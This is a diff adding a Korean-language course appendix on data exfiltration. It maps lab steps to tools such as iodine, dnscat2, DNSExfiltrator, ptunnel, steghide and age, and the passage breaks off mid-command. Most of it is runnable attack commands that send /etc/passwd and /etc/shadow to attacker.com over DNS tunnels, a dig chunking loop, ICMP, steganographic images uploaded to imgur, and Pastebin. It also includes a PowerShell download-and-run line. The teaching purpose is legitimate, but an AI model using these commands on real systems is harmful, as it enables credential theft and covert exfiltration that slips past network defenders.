@@ -715,3 +715,139 @@ graph LR
 
 **학생 액션**: malleable profile 작성.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 — Week 10 데이터 유출)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | iodine (DNS tunnel) | iodine |
+| s2 | dnscat2 (DNS C2) | dnscat2 |
+| s3 | DNSExfiltrator | DNSExfiltrator |
+| s4 | ICMP tunnel | ptunnel / icmpsh |
+| s5 | Steganography | steghide / outguess / openpuff |
+| s6 | age (modern crypto) | age |
+| s7 | Cloud sync | rclone / awscli |
+| s8 | 정상 channel (Pastebin/Slack) | curl + 자체 |
+
+### 학생 환경 준비
+
+```bash
+# === DNS exfil ===
+sudo apt install -y iodine
+git clone https://github.com/iagox86/dnscat2 ~/dnscat2
+git clone https://github.com/Arno0x/DNSExfiltrator /tmp/dnsexfil
+
+# === ICMP tunnel ===
+sudo apt install -y ptunnel
+git clone https://github.com/inquisb/icmpsh ~/icmpsh
+
+# === Steganography ===
+sudo apt install -y steghide outguess
+# OpenPuff (Win) — 학습 참고
+
+# === age (modern crypto) ===
+curl -L https://github.com/FiloSottile/age/releases/latest/download/age-v1.1.1-linux-amd64.tar.gz | tar xz
+sudo mv age/age age/age-keygen /usr/local/bin/
+
+# === rclone (50+ cloud backend) ===
+curl https://rclone.org/install.sh | sudo bash
+
+# === interactsh (OOB) ===
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+```
+
+### Exfil 채널 7 종류
+
+```bash
+# === 1. DNS — iodine (TUN — 풀 IP traffic) ===
+# Server (attacker, NS 도메인 필요)
+sudo iodined -f -c -P pwd 10.0.0.1 t.attacker.com
+
+# Client (victim)
+sudo iodine -f -P pwd t.attacker.com
+
+# Tunnel 자동 생성 (dns0 인터페이스)
+ip addr show dns0
+# 모든 IP traffic 가 DNS 으로 wrapping
+
+# 사용:
+ssh -i key root@10.0.0.1                                   # iodine 통해
+scp /etc/passwd 10.0.0.1:/tmp/                             # 파일 전송
+
+# === 2. DNS — dnscat2 (단순 C2) ===
+# Server
+ruby ~/dnscat2/server/dnscat2.rb attacker.com --secret=mysecret
+
+# Client
+~/dnscat2/client/dnscat --secret=mysecret attacker.com
+
+# 파일 전송
+session 1> upload /etc/passwd /tmp/exfil-passwd
+session 1> download /etc/shadow
+
+# === 3. DNS — DNSExfiltrator (단일 파일) ===
+# Server
+python3 /tmp/dnsexfil/dnsexfiltrator.py -d attacker.com -p mysecret
+
+# Client (Win, PowerShell)
+# powershell -ep bypass -c "Invoke-WebRequest 'http://github.com/...' | iex; \
+#     Invoke-DNSExfiltrator -Source 'C:\sensitive.docx' -Domain 'attacker.com'"
+
+# Linux 직접 (느림):
+DATA=$(base64 -w 0 /etc/passwd)
+for chunk in $(echo "$DATA" | fold -w 50); do
+    dig @attacker-ns "${chunk}.exfil.attacker.com" +short
+    sleep 0.5
+done
+
+# === 4. ICMP tunnel ===
+# Server (attacker)
+sudo ptunnel -x mysecret &
+
+# Client (victim) — local port 8000 → attacker 의 internal
+sudo ptunnel -p attacker.com -lp 8000 -da target -dp 22 -x mysecret
+
+# 사용
+ssh -p 8000 user@127.0.0.1                                 # ICMP tunnel 통해 SSH
+
+# === 5. Steganography (이미지/오디오 안에) ===
+# Cover image 다운로드
+wget https://example.com/normal.jpg -O /tmp/cover.jpg
+
+# 데이터 숨김
+steghide embed -cf /tmp/cover.jpg \
+    -ef /etc/passwd \
+    -p Pa\$\$w0rd
+
+# /tmp/cover.jpg 외관 그대로 — 데이터 내장
+ls -la /tmp/cover.jpg                                      # 거의 같은 size
+
+# 외부 send (정상 image upload 처럼)
+curl -F "image=@/tmp/cover.jpg" https://imgur.com/upload
+
+# 추출 (attacker 측)
+steghide extract -sf /tmp/cover.jpg -p Pa\$\$w0rd
+
+# Outguess 대안
+outguess -k Pa\$\$w0rd -d /etc/passwd /tmp/cover.jpg /tmp/stego.jpg
+
+# === 6. age (암호화 + 정상 channel) ===
+age-keygen -o /tmp/key.txt
+PUBKEY=$(grep public /tmp/key.txt | cut -d' ' -f4)
+
+# 데이터 암호화
+age -r $PUBKEY < /etc/passwd > /tmp/passwd.age
+
+# 정상 HTTP 으로 전송 (다양한 위장 방법):
+# Pastebin
+curl -X POST https://pastebin.com/api/api_post.php \
+    -d "api_dev_key=$PASTEBIN_KEY" \
+    -d "api_option=paste" \
+    -d "api_paste_code=$(base64 < /tmp/passwd.age)"
+
+# GitHub Gist (private)
+g
